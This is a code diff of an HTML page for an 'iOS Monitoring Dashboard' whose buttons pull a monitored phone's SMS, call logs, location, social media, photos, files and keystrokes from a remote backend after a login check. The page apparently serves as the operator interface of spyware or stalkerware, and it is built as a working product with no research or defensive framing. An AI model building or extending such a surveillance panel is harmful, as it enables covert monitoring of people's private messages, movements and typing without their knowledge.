@@ -8,18 +8,47 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <!-- Add your HTML structure for the dashboard here -->
-    <button id="logoutButton" class="logout"><i class="fas fa-sign-out-alt"></i> Logout</button>
-    <div id="dataDisplay">Select an activity to display data here.</div>
+    <!-- Video Background -->
+    <video autoplay muted loop id="backgroundVideo">
+        <source src="binary_rain.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <!-- Header Section with Navigation and Social Links -->
+    <header id="header" class="header-top">
+        <div class="container">
+            <h1><a href="index.html">Monitoring Dashboard</a></h1>
+            <h2>Real-Time Monitoring for <span style="color:#12D640">iOS Activities</span></h2>
+            <button onclick="logout()" class="logout-button"><i class="fas fa-sign-out-alt"></i> Logout</button>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main>
+        <h1>iOS Monitoring Dashboard</h1>
+        <div class="activity-buttons">
+            <button onclick="fetchData('Notifications')" class="notifications"><i class="fas fa-bell"></i> Notifications</button>
+            <button onclick="fetchData('SMS')" class="sms"><i class="fas fa-sms"></i> SMS Monitoring</button>
+            <button onclick="fetchData('CallLogs')" class="call-logs"><i class="fas fa-phone-alt"></i> Call Logs</button>
+            <button onclick="fetchData('Location')" class="location"><i class="fas fa-map-marker-alt"></i> Location</button>
+            <button onclick="fetchData('SocialMedia')" class="social-media"><i class="fas fa-share-alt"></i> Social Media</button>
+            <button onclick="fetchData('GalleryAccess')" class="gallery"><i class="fas fa-image"></i> Gallery Access</button>
+            <button onclick="fetchData('FileManager')" class="file-manager"><i class="fas fa-folder-open"></i> File Manager</button>
+            <button onclick="fetchData('Keystrokes')" class="keystrokes"><i class="fas fa-keyboard"></i> Keystrokes</button>
+        </div>
+        
+        <div id="dataDisplay">Select an activity to display data here.</div>
+    </main>
 
     <script>
         // Check if user is authenticated before displaying dashboard content
         fetch('https://iosx.onrender.com/auth-status', {
-            credentials: 'include' // Send cookies with the request
+            credentials: 'include'
         })
         .then(response => response.json())
         .then(data => {
             if (!data.authenticated) {
+                // Redirect to landing page if not authenticated
                 window.location.href = "landing.html";
             }
         })
@@ -31,7 +60,7 @@
         // Function to fetch data based on activity type
         function fetchData(activityType) {
             fetch(`https://iosx.onrender.com/fetch/${activityType}`, {
-                credentials: 'include' // Send cookies with the request
+                credentials: 'include'
             })
             .then(response => response.json())
             .then(data => {
@@ -42,21 +71,21 @@
             });
         }
 
-        // Logout functionality
-        document.getElementById('logoutButton').addEventListener('click', () => {
+        // Logout function
+        function logout() {
             fetch('https://iosx.onrender.com/logout', {
                 method: 'POST',
-                credentials: 'include' // Send cookies with the request
+                credentials: 'include'
             })
             .then(response => {
                 if (response.ok) {
-                    window.location.href = "landing.html";
+                    window.location.href = "landing.html"; // Redirect to landing page after logout
                 }
             })
             .catch(error => {
-                console.error("Error logging out:", error);
+                console.error("Error during logout:", error);
             });
-        });
+        }
     </script>
 </body>
 </html>
